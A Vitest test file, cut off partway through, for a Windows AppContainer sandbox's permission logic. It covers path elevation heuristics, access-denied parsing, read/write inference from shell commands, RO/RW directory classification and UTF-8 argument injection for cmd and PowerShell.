/**
 * Tests for sandbox permission logic.
 *
 * Tests pure functions and regex patterns used in sandbox-preload.js
 * and main.ts for permission management.
 */
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import path from "path";

// ── likelyNeedsElevation heuristic ──
// Reimplemented here since it's a private function in main.ts.
// If this logic changes in main.ts, update these tests accordingly.
function likelyNeedsElevation(dir: string): boolean {
  const norm = path.resolve(dir).toLowerCase();
  const parts = norm.split(path.sep).filter(Boolean);
  if (parts.length <= 1) return true;
  const topDir = parts[1];
  const systemDirs = ["users", "windows", "program files", "program files (x86)", "programdata"];
  if (parts.length === 2 && systemDirs.includes(topDir)) return true;
  if (parts.length === 3 && topDir === "users") return true;
  return false;
}

describe("likelyNeedsElevation", () => {
  it("drive root needs elevation", () => {
    expect(likelyNeedsElevation("C:\\")).toBe(true);
    expect(likelyNeedsElevation("D:\\")).toBe(true);
  });

  it("C:\\Users needs elevation", () => {
    expect(likelyNeedsElevation("C:\\Users")).toBe(true);
  });

  it("C:\\Windows needs elevation", () => {
    expect(likelyNeedsElevation("C:\\Windows")).toBe(true);
  });

  it("C:\\Program Files needs elevation", () => {
    expect(likelyNeedsElevation("C:\\Program Files")).toBe(true);
  });

  it("C:\\ProgramData needs elevation", () => {
    expect(likelyNeedsElevation("C:\\ProgramData")).toBe(true);
  });

  it("user profile directory needs elevation (inheritance protected)", () => {
    expect(likelyNeedsElevation("C:\\Users\\someone")).toBe(true);
  });

  it("subdirectory of user profile does NOT need elevation", () => {
    expect(likelyNeedsElevation("C:\\Users\\someone\\Documents")).toBe(false);
  });

  it("custom top-level directory does NOT need elevation", () => {
    expect(likelyNeedsElevation("C:\\MyData")).toBe(false);
    expect(likelyNeedsElevation("C:\\a")).toBe(false);
    expect(likelyNeedsElevation("D:\\projects")).toBe(false);
  });

  it("deep path does NOT need elevation", () => {
    expect(likelyNeedsElevation("C:\\Users\\someone\\Desktop\\folder")).toBe(false);
  });
});

// ── isNonFilePath (named pipes, device paths) ──
// Reimplemented from sandbox-preload.js
function isNonFilePath(p: string): boolean {
  const s = String(p);
  if (s.indexOf("\\\\.\\") === 0 || s.indexOf("\\\\?\\") === 0) return true;
  if (/^\\\\[.?]\\/.test(s)) return true;
  return false;
}

describe("isNonFilePath", () => {
  it("detects named pipes", () => {
    expect(isNonFilePath("\\\\.\\pipe\\conpty-12345-in")).toBe(true);
    expect(isNonFilePath("\\\\.\\pipe\\somepipe")).toBe(true);
  });

  it("detects device paths", () => {
    expect(isNonFilePath("\\\\.\\PhysicalDrive0")).toBe(true);
    expect(isNonFilePath("\\\\?\\Volume{guid}")).toBe(true);
  });

  it("does not match normal file paths", () => {
    expect(isNonFilePath("C:\\Users\\test")).toBe(false);
    expect(isNonFilePath("D:\\data\\file.txt")).toBe(false);
    expect(isNonFilePath("\\\\server\\share")).toBe(false);
  });

  it("does not match empty or short strings", () => {
    expect(isNonFilePath("")).toBe(false);
    expect(isNonFilePath("C:")).toBe(false);
  });
});

// ── Python Access Denied pattern ──
// Tests the regex added to PATH_EXTRACT_PATTERNS in sandbox-preload.js
const PYTHON_ACCESS_DENIED_RE =
  /access is denied:\s+['\u2018\u2019]([a-zA-Z]:\\[^'\u2018\u2019]*)['\u2018\u2019]/i;

describe("Python Access Denied pattern", () => {
  it("matches standard Python PermissionError format", () => {
    const output = "PermissionError: [WinError 5] Access is denied: 'C:\\b'";
    const m = output.match(PYTHON_ACCESS_DENIED_RE);
    expect(m).not.toBeNull();
    expect(m![1]).toBe("C:\\b");
  });

  it("matches path with spaces", () => {
    const output = "Access is denied: 'C:\\Program Files\\data'";
    const m = output.match(PYTHON_ACCESS_DENIED_RE);
    expect(m).not.toBeNull();
    expect(m![1]).toBe("C:\\Program Files\\data");
  });

  it("matches path with deep nesting", () => {
    const output = "Access is denied: 'D:\\projects\\work\\secret\\file.txt'";
    const m = output.match(PYTHON_ACCESS_DENIED_RE);
    expect(m).not.toBeNull();
    expect(m![1]).toBe("D:\\projects\\work\\secret\\file.txt");
  });

  it("matches Unicode left/right single quotes", () => {
    const output = "Access is denied: \u2018C:\\data\u2019";
    const m = output.match(PYTHON_ACCESS_DENIED_RE);
    expect(m).not.toBeNull();
    expect(m![1]).toBe("C:\\data");
  });

  it("does not match non-Windows paths", () => {
    const output = "Access is denied: '/tmp/data'";
    const m = output.match(PYTHON_ACCESS_DENIED_RE);
    expect(m).toBeNull();
  });

  it("is case insensitive", () => {
    const output = "ACCESS IS DENIED: 'C:\\test'";
    const m = output.match(PYTHON_ACCESS_DENIED_RE);
    expect(m).not.toBeNull();
    expect(m![1]).toBe("C:\\test");
  });
});

// ── handlePermissionDecision ──
// Reimplemented from sandbox-preload.js
function handlePermissionDecision(
  decision: string,
  roDir: string,
  isWrite: boolean,
  readCache: Record<string, number>,
  writeCache: Record<string, number>,
  denySet: Set<string>,
): boolean {
  const now = Date.now();
  if (decision === "allow-once") {
    if (isWrite) writeCache[roDir] = now + 5000;
    else readCache[roDir] = now + 5000;
    return false;
  } else if (decision === "grant-rw") {
    writeCache[roDir] = Infinity;
    return false;
  } else if (decision === "grant-ro") {
    if (isWrite) {
      denySet.add(roDir);
      return true;
    }
    readCache[roDir] = Infinity;
    return false;
  } else {
    denySet.add(roDir);
    return true;
  }
}

describe("handlePermissionDecision", () => {
  it("grant-rw allows both read and write", () => {
    const rc: Record<string, number> = {};
    const wc: Record<string, number> = {};
    const ds = new Set<string>();
    expect(handlePermissionDecision("grant-rw", "c:\\a\\", false, rc, wc, ds)).toBe(false);
    expect(wc["c:\\a\\"]).toBe(Infinity);
    expect(handlePermissionDecision("grant-rw", "c:\\b\\", true, rc, wc, ds)).toBe(false);
    expect(wc["c:\\b\\"]).toBe(Infinity);
  });

  it("grant-ro allows read but blocks write", () => {
    const rc: Record<string, number> = {};
    const wc: Record<string, number> = {};
    const ds = new Set<string>();
    expect(handlePermissionDecision("grant-ro", "c:\\a\\", false, rc, wc, ds)).toBe(false);
    expect(rc["c:\\a\\"]).toBe(Infinity);
    expect(handlePermissionDecision("grant-ro", "c:\\b\\", true, rc, wc, ds)).toBe(true);
    expect(ds.has("c:\\b\\")).toBe(true);
  });

  it("allow-once sets short TTL", () => {
    const rc: Record<string, number> = {};
    const wc: Record<string, number> = {};
    const ds = new Set<string>();
    expect(handlePermissionDecision("allow-once", "c:\\a\\", false, rc, wc, ds)).toBe(false);
    expect(rc["c:\\a\\"]).toBeGreaterThan(Date.now());
    expect(rc["c:\\a\\"]).toBeLessThan(Date.now() + 10000);
  });

  it("deny blocks and adds to deny set", () => {
    const rc: Record<string, number> = {};
    const wc: Record<string, number> = {};
    const ds = new Set<string>();
    expect(handlePermissionDecision("deny", "c:\\a\\", false, rc, wc, ds)).toBe(true);
    expect(ds.has("c:\\a\\")).toBe(true);
  });
});

// ── findRestrictedDir logic ──
// Tests the heuristic for determining which directory to show in permission dialog
describe("findRestrictedDir heuristic", () => {
  // Reimplemented from sandbox-state.js (no-RO-match fallback path)
  function findRestrictedDir(resolvedLower: string): string {
    const hasExt = /\.[a-z0-9]{1,10}$/i.test(resolvedLower);
    let dir: string;
    if (hasExt) {
      dir = path.dirname(resolvedLower);
    } else {
      dir = resolvedLower;
    }
    if (dir[dir.length - 1] !== path.sep) dir += path.sep;
    if (/^[a-z]:\\$/i.test(dir)) {
      let asDir = resolvedLower;
      if (asDir[asDir.length - 1] !== path.sep) asDir += path.sep;
      return asDir;
    }
    return dir;
  }

  it("directory path returns path with trailing sep", () => {
    expect(findRestrictedDir("c:\\users\\hasu")).toBe("c:\\users\\hasu\\");
  });

  it("file path returns parent directory", () => {
    expect(findRestrictedDir("c:\\users\\hasu\\file.txt")).toBe("c:\\users\\hasu\\");
  });

  it("drive root stays as drive root", () => {
    const result = findRestrictedDir("c:");
    expect(result).toBe("c:\\");
  });

  it("extensionless file treated as directory", () => {
    expect(findRestrictedDir("c:\\data\\myfile")).toBe("c:\\data\\myfile\\");
  });

  it("deeply nested file goes to parent", () => {
    expect(findRestrictedDir("c:\\a\\b\\c\\d.log")).toBe("c:\\a\\b\\c\\");
  });
});

describe("findRestrictedDir with RO dirs", () => {
  // Full reimplementation including RO dir matching
  function findRestrictedDirFull(resolvedLower: string, roDirs: string[]): string {
    let best = "";
    for (const ro of roDirs) {
      if (
        (resolvedLower === ro.slice(0, -1) || resolvedLower.indexOf(ro) === 0) &&
        ro.length > best.length
      )
        best = ro;
    }
    const hasExt = /\.[a-z0-9]{1,10}$/i.test(resolvedLower);
    let dir: string = hasExt ? path.dirname(resolvedLower) : resolvedLower;
    if (dir[dir.length - 1] !== path.sep) dir += path.sep;
    if (best) {
      if (dir === best) return best;
      return dir;
    }
    if (/^[a-z]:\\$/i.test(dir)) {
      let asDir = resolvedLower;
      if (asDir[asDir.length - 1] !== path.sep) asDir += path.sep;
      return asDir;
    }
    return dir;
  }

  it("file in subdirectory of RO dir → returns file's parent (not RO root)", () => {
    // c:\a is RO, file is c:\a\b\test.txt → grant target should be c:\a\b\ (not c:\a\)
    expect(findRestrictedDirFull("c:\\a\\b\\test.txt", ["c:\\a\\"])).toBe("c:\\a\\b\\");
  });

  it("file directly in RO dir → returns the RO dir", () => {
    // c:\a is RO, file is c:\a\test.txt → grant target is c:\a\ (the RO dir itself)
    expect(findRestrictedDirFull("c:\\a\\test.txt", ["c:\\a\\"])).toBe("c:\\a\\");
  });

  it("directory in RO dir → returns that directory (not RO root)", () => {
    expect(findRestrictedDirFull("c:\\a\\b", ["c:\\a\\"])).toBe("c:\\a\\b\\");
  });

  it("directory that IS the RO dir → returns the RO dir", () => {
    expect(findRestrictedDirFull("c:\\a", ["c:\\a\\"])).toBe("c:\\a\\");
  });

  it("deeply nested file → returns immediate parent", () => {
    expect(findRestrictedDirFull("c:\\data\\x\\y\\z\\file.log", ["c:\\data\\"])).toBe(
      "c:\\data\\x\\y\\z\\",
    );
  });

  it("most specific RO dir is matched first", () => {
    // Both c:\a\ and c:\a\b\ are RO — file's parent is returned (not either RO dir)
    expect(findRestrictedDirFull("c:\\a\\b\\c\\file.txt", ["c:\\a\\", "c:\\a\\b\\"])).toBe(
      "c:\\a\\b\\c\\",
    );
  });

  it("file parent equals deeper RO dir → returns the RO dir", () => {
    expect(findRestrictedDirFull("c:\\a\\b\\file.txt", ["c:\\a\\", "c:\\a\\b\\"])).toBe(
      "c:\\a\\b\\",
    );
  });

  it("no RO dir match → falls through to default heuristic", () => {
    expect(findRestrictedDirFull("c:\\other\\file.txt", ["c:\\a\\"])).toBe("c:\\other\\");
  });
});

// ── inferAccessNeeded ──
// Import from sandbox-permission.js (CommonJS)
const perm = require("../../appcontainer/sandbox-permission.js");
const inferAccessNeeded = perm.inferAccessNeeded;

describe("inferAccessNeeded", () => {
  describe("simple commands (no shell prefix)", () => {
    it("ls → ro", () => {
      expect(inferAccessNeeded("ls C:\\data")).toBe("ro");
    });

    it("dir → ro", () => {
      expect(inferAccessNeeded("dir C:\\Users\\test")).toBe("ro");
    });

    it("Get-ChildItem → ro", () => {
      expect(inferAccessNeeded("Get-ChildItem C:\\a")).toBe("ro");
    });

    it("gci → ro", () => {
      expect(inferAccessNeeded("gci C:\\temp")).toBe("ro");
    });

    it("Get-Content → ro", () => {
      expect(inferAccessNeeded("Get-Content C:\\a\\file.txt")).toBe("ro");
    });

    it("cat → ro", () => {
      expect(inferAccessNeeded("cat C:\\logs\\app.log")).toBe("ro");
    });

    it("type → ro", () => {
      expect(inferAccessNeeded("type C:\\readme.txt")).toBe("ro");
    });

    it("unknown command → rw", () => {
      expect(inferAccessNeeded("myapp C:\\data")).toBe("rw");
    });

    it("empty → rw", () => {
      expect(inferAccessNeeded("")).toBe("rw");
    });

    it("null → rw", () => {
      expect(inferAccessNeeded(null)).toBe("rw");
    });
  });

  describe("with shell prefix (short name)", () => {
    it("pwsh -Command ls → ro", () => {
      expect(inferAccessNeeded("pwsh -NoProfile -Command ls C:\\data")).toBe("ro");
    });

    it("powershell -Command dir → ro", () => {
      expect(inferAccessNeeded("powershell -Command dir C:\\a")).toBe("ro");
    });

    it("cmd /c dir → ro", () => {
      expect(inferAccessNeeded("cmd /c dir C:\\a")).toBe("ro");
    });

    it("cmd.exe /d /s /c type → ro", () => {
      expect(inferAccessNeeded("cmd.exe /d /s /c type C:\\readme.txt")).toBe("ro");
    });
  });

  describe("with full-path shell prefix (regression)", () => {
    it("C:\\...\\pwsh.exe -Command ls → ro", () => {
      expect(
        inferAccessNeeded(
          'C:\\Program Files\\PowerShell\\7\\pwsh.exe -NoProfile -NonInteractive -Command ls "C:\\Users\\hasu\\OneDrive - Microsoft\\Documents"',
        ),
      ).toBe("ro");
    });

    it("C:\\Windows\\System32\\cmd.exe /c dir → ro", () => {
      expect(inferAccessNeeded("C:\\Windows\\System32\\cmd.exe /c dir C:\\a")).toBe("ro");
    });

    it("C:\\...\\powershell.exe -Command Get-ChildItem → ro", () => {
      expect(
        inferAccessNeeded(
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command Get-ChildItem C:\\data",
        ),
      ).toBe("ro");
    });

    it("C:\\...\\pwsh.exe -Command Remove-Item → rw", () => {
      expect(
        inferAccessNeeded(
          'C:\\Program Files\\PowerShell\\7\\pwsh.exe -Command Remove-Item "C:\\temp\\old.txt"',
        ),
      ).toBe("rw");
    });
  });

  describe("write detection", () => {
    it("Out-File → rw", () => {
      expect(inferAccessNeeded('ls | Out-File "C:\\output.txt"')).toBe("rw");
    });

    it("redirect > → rw", () => {
      expect(inferAccessNeeded("dir > C:\\output.txt")).toBe("rw");
    });

    it("Set-Content → rw (piped)", () => {
      expect(inferAccessNeeded('"hello" | Set-Content C:\\file.txt')).toBe("rw");
    });

    it("icacls with /grant → rw", () => {
      expect(inferAccessNeeded("icacls C:\\a /grant Users:F")).toBe("rw");
    });

    it("icacls read-only → ro", () => {
      expect(inferAccessNeeded("icacls C:\\a")).toBe("ro");
    });
  });
});

// ── classifyAuthLevel ──
// Determines whether a resolved path is in RW dirs, RO dirs, or neither.
// This drives the permission dialog behavior when Access Denied is detected
// after command execution:
//   "rw"   → silent retry (ACL propagation wait)
//   "ro"   → prompt for RW upgrade
//   "none" → prompt for initial permission

const cpHooks = require("../../appcontainer/sandbox-cp-hooks.js");
const classifyAuthLevel = cpHooks.classifyAuthLevel;

describe("classifyAuthLevel", () => {
  const rwDirs = ["c:\\users\\admin\\.openclaw\\", "c:\\projects\\myapp\\"];
  const roDirs = ["c:\\users\\admin\\desktop\\", "c:\\users\\admin\\documents\\"];

  describe("RW-authorized paths", () => {
    it("exact match (without trailing sep) → rw", () => {
      expect(classifyAuthLevel("c:\\users\\admin\\.openclaw", rwDirs, roDirs)).toBe("rw");
    });

    it("child path → rw", () => {
      expect(
        classifyAuthLevel("c:\\users\\admin\\.openclaw\\workspace\\file.txt", rwDirs, roDirs),
      ).toBe("rw");
    });

    it("exact dir with trailing sep already stripped → rw", () => {
      expect(classifyAuthLevel("c:\\projects\\myapp", rwDirs, roDirs)).toBe("rw");
    });

    it("subdirectory of RW dir → rw", () => {
      expect(classifyAuthLevel("c:\\projects\\myapp\\src\\index.ts", rwDirs, roDirs)).toBe("rw");
    });
  });

  describe("RO-authorized paths", () => {
    it("exact match (without trailing sep) → ro", () => {
      expect(classifyAuthLevel("c:\\users\\admin\\desktop", rwDirs, roDirs)).toBe("ro");
    });

    it("child path → ro", () => {
      expect(classifyAuthLevel("c:\\users\\admin\\desktop\\file.txt", rwDirs, roDirs)).toBe("ro");
    });

    it("documents subfolder → ro", () => {
      expect(classifyAuthLevel("c:\\users\\admin\\documents\\report.docx", rwDirs, roDirs)).toBe(
        "ro",
      );
    });
  });

  describe("unauthorized paths", () => {
    it("completely unrelated path → none", () => {
      expect(classifyAuthLevel("d:\\data\\files", rwDirs, roDirs)).toBe("none");
    });

    it("parent of authorized dir → none", () => {
      expect(classifyAuthLevel("c:\\users\\admin", rwDirs, roDirs)).toBe("none");
    });

    it("sibling of authorized dir → none", () => {
      expect(classifyAuthLevel("c:\\users\\admin\\downloads\\file.zip", rwDirs, roDirs)).toBe(
        "none",
      );
    });
  });

  describe("RW takes precedence over RO", () => {
    it("path in both RW and RO → rw wins", () => {
      // If a path is somehow in both lists, RW check runs first
      const bothRW = ["c:\\shared\\"];
      const bothRO = ["c:\\shared\\"];
      expect(classifyAuthLevel("c:\\shared\\file.txt", bothRW, bothRO)).toBe("rw");
    });
  });

  describe("edge cases", () => {
    it("empty dirs lists → none", () => {
      expect(classifyAuthLevel("c:\\anything", [], [])).toBe("none");
    });

    it("drive root path → matches if drive root is in list", () => {
      expect(classifyAuthLevel("c:\\", ["c:\\"], [])).toBe("rw");
    });

    it("path prefix collision (c:\\usersXYZ vs c:\\users\\) → none", () => {
      // "c:\\usersXYZ" should NOT match "c:\\users\\" — indexOf would find it
      // but the dir entry has trailing sep, so startsWith check should work
      const dirs = ["c:\\users\\"];
      // "c:\\usersxyz".indexOf("c:\\users\\") === -1 because of the backslash
      expect(classifyAuthLevel("c:\\usersxyz", [], dirs)).toBe("none");
    });
  });
});

// ── RO→RW upgrade scenario (integration-level description) ──

describe("RO-to-RW upgrade scenario", () => {
  it("Desktop with RO auth: classifyAuthLevel returns 'ro' for write attempts", () => {
    const rwDirs: string[] = [];
    const roDirs = ["c:\\users\\administrator\\desktop\\"];

    // When Move-Item fails with Access Denied on Desktop...
    const level = classifyAuthLevel(
      "c:\\users\\administrator\\desktop\\somefolder",
      rwDirs,
      roDirs,
    );
    // classifyAuthLevel should return "ro", meaning:
    // → handleAsyncAccessDenied will trigger RW upgrade dialog (not silent retry)
    expect(level).toBe("ro");
  });

  it("Desktop with RW auth: classifyAuthLevel returns 'rw' for access denied", () => {
    const rwDirs = ["c:\\users\\administrator\\desktop\\"];
    const roDirs: string[] = [];

    // When command fails with Access Denied but Desktop has RW...
    const level = classifyAuthLevel(
      "c:\\users\\administrator\\desktop\\somefolder",
      rwDirs,
      roDirs,
    );
    // classifyAuthLevel should return "rw", meaning:
    // → handleAsyncAccessDenied will do silent ACL propagation retry
    expect(level).toBe("rw");
  });

  it("Desktop with no auth: classifyAuthLevel returns 'none'", () => {
    const rwDirs: string[] = [];
    const roDirs: string[] = [];

    const level = classifyAuthLevel(
      "c:\\users\\administrator\\desktop\\somefolder",
      rwDirs,
      roDirs,
    );
    // → handleAsyncAccessDenied will send normal permission request
    expect(level).toBe("none");
  });
});

// ── ensureUtf8Args ──
// Injects UTF-8 encoding directives into shell command args so child
// processes inside AppContainer output UTF-8 instead of the system OEM code page.

const { ensureUtf8Args } = cpHooks;

describe("ensureUtf8Args", () => {
  describe("cmd.exe", () => {
    it("injects chcp 65001 after /c flag", () => {
      const result = ensureUtf8Args("C:\\Windows\\System32\\cmd.exe", ["/c", "dir C:\\a"]);
      expect(result).toEqual(["/c", "chcp 65001 >nul &", "dir C:\\a"]);
    });

    it("injects chcp 65001 after /C (case-insensitive)", () => {
      const result = ensureUtf8Args("cmd.exe", ["/C", "echo hello"]);
      expect(result).toEqual(["/C", "chcp 65001 >nul &", "echo hello"]);
    });

    it("injects chcp 65001 after /k flag", () => {
      const result = ensureUtf8Args("cmd.exe", ["/k", "dir"]);
      expect(result).toEqual(["/k", "chcp 65001 >nul &", "dir"]);
    });

    it("does not modify args without /c or /k", () => {
      const result = ensureUtf8Args("cmd.exe", ["/d", "/s"]);
      expect(result).toEqual(["/d", "/s"]);
    });

    it("does not modify original array", () => {
      const original = ["/c", "dir"];
      ensureUtf8Args("cmd.exe", original);
      expect(original).toEqual(["/c", "dir"]);
    });

    it("handles cmd without .exe extension", () => {
      const result = ensureUtf8Args("cmd", ["/c", "dir"]);
      expect(result).toEqual(["/c", "chcp 65001 >nul &", "dir"]);
    });
  });

  describe("pwsh.exe / powershell.exe", () => {
    it("injects OutputEncoding after -Command flag for pwsh", () => {
      const result = ensureUtf8Args("pwsh.exe", ["-NoProfile", "-Command", "Get-ChildItem"]);
      expect(result[0]).toBe("-NoProfile");
      expect(result[1]).toBe("-Command");
      expect(result[2]).toContain("[Console]::OutputEncoding");
      expect(result[3]).toBe("Get-ChildItem");
    });

    it("injects OutputEncoding after -c shorthand", () => {
      const result = ensureUtf8Args("pwsh.exe", ["-c", "ls"]);
      expect(result).toEqual([
        "-c",
        "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8;",
        "ls",
      ]);
    });

    it("works with powershell.exe", () => {
      const result = ensureUtf8Args(
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        ["-Command", "dir"],
      );
      expect(result[1]).toContain("[Console]::OutputEncoding");
    });

    it("case-insensitive -Command match", () => {
      const result = ensureUtf8Args("pwsh.exe", ["-command", "echo hi"]);
      expect(result.length).toBe(3);
      expect(result[1]).toContain("UTF8");
    });

    it("does not modify args without -Command/-c", () => {
      const result = ensureUtf8Args("pwsh.exe", ["-File", "script.ps1"]);
      expect(result).toEqual(["-File", "script.ps1"]);
    });
  });

  describe("non-shell executables", () => {
    it("returns args unchanged for node.exe", () => {
      const result = ensureUtf8Args("node.exe", ["script.js", "--flag"]);
      expect(result).toEqual(["script.js", "--flag"]);
    });

    it("returns args unchanged for python.exe", () => {
      const result = ensureUtf8Args("python.exe", ["-c", "print('hi')"]);
      expect(result).toEqual(["-c", "print('hi')"]);
    });

    it("returns empty array for empty args", () => {
      const result = ensureUtf8Args("cmd.exe", []);
      expect(result).toEqual([]);
    });
  });
});

// ── UTF-8 Chinese output integration tests ──
// Verify that child processes produce correct Chinese characters when
// decoded as UTF-8. The real sandbox pipeline uses AppContainerLauncher (C#)
// which sets Console.OutputEncoding = UTF8; here we simulate the same effect
// by spawning Node.js subprocesses that output known UTF-8 text.

import { spawnSync } from "child_process";

describe("UTF-8 Chinese output (integration)", () => {
  const CHINESE_TEXT = "你好世界";

  describe("Node.js subprocess via cmd.exe", () => {
    it("outputs correct Chinese through cmd.exe with chcp 65001", () => {
      // ensureUtf8Args injects "chcp 65001 >nul &" as a separate arg element,
      // which AppContainerLauncher reassembles into the command line.
      // Here we simulate the same by joining args after /c into one string.
      // Use a temp script file to avoid cmd.exe quote-nesting issues.
      const fs = require("fs");
      const os = require("os");
      const path = require("path");
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "utf8test-"));
      const script = path.join(tmpDir, "emit.js");
      fs.writeFileSync(script, `process.stdout.write('${CHINESE_TEXT}')`, "utf-8");
      try {
        const args = ensureUtf8Args("cmd.exe", ["/c", `node ${script}`]);
        const flagIdx = args.findIndex((a: string) => /^\/[ck]$/i.test(a));
        const combined = [...args.slice(0, flagIdx + 1), args.slice(flagIdx + 1).join(" ")];
        const result = spawnSync("cmd.exe", combined, {
          windowsHide: true,
          timeout: 10000,
        });
        expect(result.stdout.toString("utf-8")).toContain(CHINESE_TEXT);
      } finally {
        fs.unlinkSync(script);
        fs.rmdirSync(tmpDir);
      }
    });

    it("args are correctly transformed by ensureUtf8Args", () => {
      const nodeCmd = `node -e "console.log('test')"`;
      const args = ensureUtf8Args("cmd.exe", ["/c", nodeCmd]);
      // Should have chcp 65001 injected before the actual command
      expect(args.some((a: string) => a.includes("chcp 65001"))).toBe(true);
      expect(args.some((a: string) => a.includes("node"))).toBe(true);
    });
  });

  describe("pwsh.exe with OutputEncoding=UTF8", () => {
    it("Write-Output outputs correct Chinese", () => {
      const args = ensureUtf8Args("pwsh.exe", [
        "-NoProfile",
        "-Command",
        `Write-Output '${CHINESE_TEXT}'`,
      ]);
      const result = spawnSync("pwsh.exe", args, {
        encoding: "utf-8",
        windowsHide: true,
        timeout: 10000,
      });
      // Skip if pwsh not available
      if (result.error) return;
      expect(result.stdout).toContain(CHINESE_TEXT);
    });

    it("args include OutputEncoding directive", () => {
      const args = ensureUtf8Args("pwsh.exe", ["-Command", "Get-Date"]);
      expect(args.some((a: string) => a.includes("OutputEncoding"))).toBe(true);
    });
  });

  describe("Buffer.toString('utf-8') decoding", () => {
    it("decodes Chinese UTF-8 bytes correctly", () => {
      // "你好" in UTF-8: E4BDA0 E5A5BD
      const buf = Buffer.from([0xe4, 0xbd, 0xa0, 0xe5, 0xa5, 0xbd]);
      expect(buf.toString("utf-8")).toBe("你好");
    });

    it("decodes mixed ASCII + Chinese UTF-8 bytes", () => {
      // "Hello你好" in UTF-8
      const buf = Buffer.from([
        0x48,
        0x65,
        0x6c,
        0x6c,
        0x6f, // "Hello"
        0xe4,
        0xbd,
        0xa0, // "你"
        0xe5,
        0xa5,
        0xbd, // "好"
      ]);
      expect(buf.toString("utf-8")).toBe("Hello你好");
    });

    it("Node.js subprocess raw Buffer decoded as utf-8", () => {
      // Spawn node that outputs Chinese, read raw Buffer, decode as UTF-8
      const result = spawnSync("node", ["-e", `process.stdout.write('${CHINESE_TEXT}')`], {
        windowsHide: true,
        timeout: 5000,
      });
      expect(result.stdout.toString("utf-8")).toBe(CHINESE_TEXT);
    });
  });
});

// ── isSubdirectoryOf ──
// Reimplemented from main.ts
function isSubdirectoryOf(parentDir: string, childDir: string): boolean {
  const normalParent = path.resolve(parentDir).toLowerCase();
  const normalChild = path.resolve(childDir).toLowerCase();
  if (normalParent === normalChild) return false;
  const parentWithSep = normalParent.endsWith(path.sep) ? normalParent : normalParent + path.sep;
  return normalChild.startsWith(parentWithSep);
}

describe("isSubdirectoryOf", () => {
  it("child is a subdirectory of parent", () => {
    expect(isSubdirectoryOf("C:\\Data", "C:\\Data\\Sub")).toBe(true);
    expect(isSubdirectoryOf("C:\\Data", "C:\\Data\\Sub\\Deep")).toBe(true);
  });

  it("same directory is NOT a subdirectory", () => {
    expect(isSubdirectoryOf("C:\\Data", "C:\\Data")).toBe(false);
  });

  it("sibling directory is NOT a subdirectory", () => {
    expect(isSubdirectoryOf("C:\\Data", "C:\\DataOther")).toBe(false);
    expect(isSubdirectoryOf("C:\\Data", "C:\\DataSuffix")).toBe(false);
  });

  it("parent of parent is NOT a subdirectory", () => {
    expect(isSubdirectoryOf("C:\\Data\\Sub", "C:\\Data")).toBe(false);
  });

  it("case insensitive", () => {
    expect(isSubdirectoryOf("C:\\DATA", "c:\\data\\sub")).toBe(true);
  });

  it("drive root as parent", () => {
    expect(isSubdirectoryOf("C:\\", "C:\\Data")).toBe(true);
    expect(isSubdirectoryOf("C:\\", "C:\\")).toBe(false);
  });

  it("handles trailing separators", () => {
    expect(isSubdirectoryOf("C:\\Data\\", "C:\\Data\\Sub")).toBe(true);
    expect(isSubdirectoryOf("C:\\Data", "C:\\Data\\Sub\\")).toBe(true);
  });
});

// ── hasExplicitSidAce ──
// Reimplemented from main.ts — parses icacls output for explicit vs inherited ACEs
function hasExplicitSidAce(icaclsOutput: string, sid: string): boolean {
  const lines = icaclsOutput.split(/\r?\n/);
  for (const line of lines) {
    const sidIdx = line.indexOf(sid);
    if (sidIdx < 0) continue;
    const afterSid = line.substring(sidIdx + sid.length);
    if (!/\(I\)/.test(afterSid)) return true;
  }
  return false;
}

describe("hasExplicitSidAce", () => {
  const SID = "S-1-15-2-12345";

  it("detects explicit ACE (no (I) flag)", () => {
    const output = `C:\\Data ${SID}:(OI)(CI)(M)\n`;
    expect(hasExplicitSidAce(output, SID)).toBe(true);
  });

  it("returns false when only inherited ACEs exist", () => {
    const output = `C:\\Data ${SID}:(I)(OI)(CI)(RX)\n`;
    expect(hasExplicitSidAce(output, SID)).toBe(false);
  });

  it("detects explicit when both explicit and inherited exist", () => {
    const output = `C:\\Data ${SID}:(OI)(CI)(M)\n            ${SID}:(I)(OI)(CI)(RX)\n`;
    expect(hasExplicitSidAce(output, SID)).toBe(true);
  });

  it("returns false when SID not in output", () => {
    const output = "C:\\Data BUILTIN\\Users:(OI)(CI)(RX)\n";
    expect(hasExplicitSidAce(output, SID)).toBe(false);
  });

  it("handles multiple inherited entries", () => {
    const output = `C:\\Data ${SID}:(I)(OI)(CI)(RX)\n            ${SID}:(I)(OI)(CI)(R)\n`;
    expect(hasExplicitSidAce(output, SID)).toBe(false);
  });
});

// ── Parent/child directory interaction in isBlockedPath ──
// Tests the "most specific match wins" logic in sandbox-state.js
describe("parent/child directory permission interaction", () => {
  // Reimplemented from sandbox-state.js isBlockedPath logic
  function isBlockedPath(filePath: string, rwDirs: string[], roDirs: string[]): boolean {
    const resolved = path.resolve(String(filePath)).toLowerCase();
    let rwMatchLen = 0;
    for (const rw of rwDirs) {
      if ((resolved === rw.slice(0, -1) || resolved.indexOf(rw) === 0) && rw.length > rwMatchLen) {
        rwMatchLen = rw.length;
      }
    }
    let roMatchLen = 0;
    for (const ro of roDirs) {
      if ((resolved === ro.slice(0, -1) || resolved.indexOf(ro) === 0) && ro.length > roMatchLen) {
        roMatchLen = ro.length;
      }
    }
    if (rwMatchLen > 0 && rwMatchLen > roMatchLen) return false;
    return true;
  }

  it("parent RO, child RW: file under child is NOT blocked (RW wins)", () => {
    const roDirs = ["c:\\data\\"];
    const rwDirs = ["c:\\data\\sub\\"];
    expect(isBlockedPath("C:\\Data\\Sub\\file.txt", rwDirs, roDirs)).toBe(false);
  });

  it("parent RO, child RW: file directly under parent IS blocked (RO)", () => {
    const roDirs = ["c:\\data\\"];
    const rwDirs = ["c:\\data\\sub\\"];
    expect(isBlockedPath("C:\\Data\\file.txt", rwDirs, roDirs)).toBe(true);
  });

  it("parent RO, child RW: child dir itself is NOT blocked", () => {
    const roDirs = ["c:\\data\\"];
    const rwDirs = ["c:\\data\\sub\\"];
    expect(isBlockedPath("C:\\Data\\Sub", rwDirs, roDirs)).toBe(false);
  });

  it("parent RW, child RO: file under child is still NOT blocked (parent RW wins because longer match absent)", () => {
    // This tests the current behavior: RW match on parent is found first.
    // The child RO is more specific but classifyAuthLevel uses RW-first check.
    const roDirs = ["c:\\data\\sub\\"];
